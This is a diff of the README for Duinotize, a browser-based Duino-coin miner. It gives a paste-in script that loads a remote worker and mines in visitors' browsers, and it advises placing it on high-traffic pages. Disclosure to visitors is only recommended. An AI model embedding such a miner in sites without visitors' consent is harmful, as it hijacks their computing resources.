@@ -10,15 +10,15 @@ Put the following code at the very bottom of the HTML page(s) you want the miner
     let threads = 1; 
     let workerVer = 0;
     for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
-        let socketWorker = new Worker("/duinotize.js");
-        socketWorker.postMessage('Start,' + "rpinews" + "," + "duinotize-rig" + "," + workerVer + "," + Math.floor(Math.random() * 2811) + "," + "LOW");
+        let socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/duinotize.js");
+        socketWorker.postMessage('Start,' + "username" + "," + "duinotize-rig" + "," + "difficulty" + "," + workerVer);
         workerVer++;
     }
 </script>
 ```
-NOTE: You'll want to replace `rpinews` with your Duino account username, `duinotize-rig` with the alias you want it to show up as in the web wallet, and `LOW` with a mining difficulty of either "LOW", "MEDIUM", or "EXTREME" (LOW is set by default, as MEDIUM or EXTREME causes frequent socket disconnects and may get your account banned!).
+NOTE: You'll want to replace `username` with your Duino account username, `duinotize-rig` with the alias you want it to show up as in the web wallet, and `difficulty` with a mining difficulty of either "LOW", "MEDIUM", or "EXTREME" (ALWAYS use LOW, as MEDIUM or EXTREME causes frequent socket disconnects and may get your account banned!).
 
-Now, whenever that page is opened, the miner will start and output messages to the developer console. It will stop once the page is closed. Make sure to install the miner on a page where users will be on for awhile, otherwise the miner will start and stop immediately. You can see this in action at https://mobilegmyt.github.io/Duinotize/demo/, or look [here](https://github.com/mobilegmYT/Duinotize/blob/main/demo/index.html) for the source code to that page.
+Now, whenever that page is opened, the miner will start and output messages to the developer console. It will run until the tab (not just the page) is closed. Make sure to install the miner on a page where users visit the most, so that there are more miners running. You can see this in action at https://mobilegmyt.github.io/Duinotize/demo/, or look [here](https://github.com/mobilegmYT/Duinotize/blob/main/demo/index.html) for the source code to that page for a example of how to implement it.
 
 I HIGHLY reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background (in some places it is illegal to mine crypto in the background without consent!), and optionally credit this repo.
 
